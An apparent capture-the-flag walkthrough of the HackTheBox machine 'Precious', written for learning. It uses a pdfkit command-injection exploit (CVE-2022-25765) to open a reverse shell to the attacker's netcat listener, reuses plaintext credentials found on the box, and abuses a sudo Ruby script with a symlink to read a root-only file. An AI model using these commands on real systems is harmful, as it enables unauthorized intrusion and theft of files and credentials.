## Hello everyone!

Today, we will explore “*Precious*”, an easy level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Precious/Precious_images/1.png)

(ensure that you have added the following line  `TARGET_IP     precious.htb`  to your local `/etc/hosts` file to perform DNS resolution)

## Information Gathering

First, we will launch an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Precious/Precious_images/2.png)

We can identify two running services:

**SSH** (OpenSSH 8.4p1 | 22)

**HTTP** (nginx 1.18.0 | 80)

We can start by inspecting the website hosted on port **80**:

![image](/HTB/Precious/Precious_images/3.png)

The web application allows us to convert a web page to a PDF file. We will attempt to obtain a `.pdf` file by creating a local server using `python3 -m http.server 8000` and providing our local IP to the web site:

![image](/HTB/Precious/Precious_images/4.png)

![image](/HTB/Precious/Precious_images/5.png)

We downloaded a PDF file representing the directory which hosts our Python server. Let’s get more information about the file’s technology using `exiftool`:


![image](/HTB/Precious/Precious_images/6.png)



The web application use a Ruby library name **pdfkit** to make the file conversion.

## Initial Access

Researching potential exploit about this technology led us to a GitHub repository hosting a Python script leveraging a vulnerabiltiy affecting pdfkit before **v0.8.7.2**.

![image](/HTB/Precious/Precious_images/7.png)

We can download the script and execute it with the `-h` switch to obtain more information about its usage:

![image](/HTB/Precious/Precious_images/8.png)

We can use the third template to attempt to recieve a reverse shell from the target. We can run the following command:

`python3 exploit-CVE-2022-25765.py -s YOUR_IP NC_PORT -w http://precious.htb -p url`

(ensure that you have set up a **Netcat listener** using `nc -lvnp PORT`)

![image](/HTB/Precious/Precious_images/9.png)

We successfully obtained initial access as the user **ruby**!

We can stabilize our current shell using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Inspecting `/home/ruby` directory doesn’t provide any user flag yet. However, there is a very interesting file located in the `.bundle` directory:

![image](/HTB/Precious/Precious_images/10.png)



## Privilege Escalation



There is a pair of credential: `henry:Q3c1AqGHtoI0aXAYFH`. We didn’t check yet whether there is other user on the system, let’s verify this by inspecting the /etc/passwd file and searching for a user named ***henry***:

![image](/HTB/Precious/Precious_images/11.png)

Indeed, the user exists on the Linux system! We can attempt to use the discovered credentials to authenticate via **SSH**:

![image](/HTB/Precious/Precious_images/12.png)

It works! We successfully pivoted our access to **henry**, allowing us to retrieve the first flag:

![image](/HTB/Precious/Precious_images/13.png)



## Sudo Misconfiguration Abuse

We now need to find a way to retrieve the last flag. We start enumerating local privilege escalation vectors by checking whether we can run any command with **root privileges** using `sudo -l`:

![image](/HTB/Precious/Precious_images/14.png)

It looks like we can run the following command as **root** without providing a password:

`/usr/bin/ruby /opt/update_dependencies.rb`

Instinctively, we want to check whether the `update_dependencies.rb` Ruby script is writable by us, because if it’s the case, we could modify the script in order to spawn a **root shel**l as the script will be executed via `sudo` with **root privileges**, which is very **critical** in a security perspective. We can check this using `ls -ld`:

![image](/HTB/Precious/Precious_images/15.png)

Unfortunately, we don’t have write permissions. However, we still can read and execute the script, which can be a privilege escalation vector if the script doesn’t handle something properly. Let’s check its content:

![image](/HTB/Precious/Precious_images/16.png)

We can observe a file path handling issue in a script executed under sudo, where `dependencies.yml` is referenced using a relative path. We can verify it by creating a malicious `dependencies.yml` file and execute the script via **sudo**:

![image](/HTB/Precious/Precious_images/17.png)

The script reads the `dependencies.yml` file from the current working directory, allowing the script to access a privileged file via a symbolic link. It means that we can create a symbolic link using ln -sf to redirect the file path to `/root/root.txt` that will leak its content as we did above. Since the script runs with **root privileges**, it follows the symbolic link and reads `/root/root.txt`. To make a symlink, we will run the following command:

`ln -sf /root/root.txt dependencies.yml` (if the malicious file is in the same directory)

![image](/HTB/Precious/Precious_images/18.png)

Awesome, without directly escalating privileges, we caught the final flag!

![image](/HTB/Precious/Precious_images/19.png)


## Conclusion

This machine was a good example of how multiple small misconfigurations can chain together into a full compromise. The initial access relied on a vulnerable PDF generation feature using an outdated Ruby library, which allowed remote code execution and foothold on the system as the low-privileged user.

From there, the privilege escalation path was not based on a kernel exploit or complex binary vulnerability, but on a simple yet critical misconfiguration in a sudo-allowed Ruby script. The combination of a relative file path and unsafe file handling made it possible to influence what the script reads when executed as root.

Overall, this box highlights two important security lessons: always keep third-party libraries up to date, especially those processing user-controlled input, and avoid relying on unsafe file path resolution or deserialization patterns in privileged scripts.

A solid reminder that in real-world environments, privilege escalation often comes from design and configuration issues rather than advanced exploitation techniques.
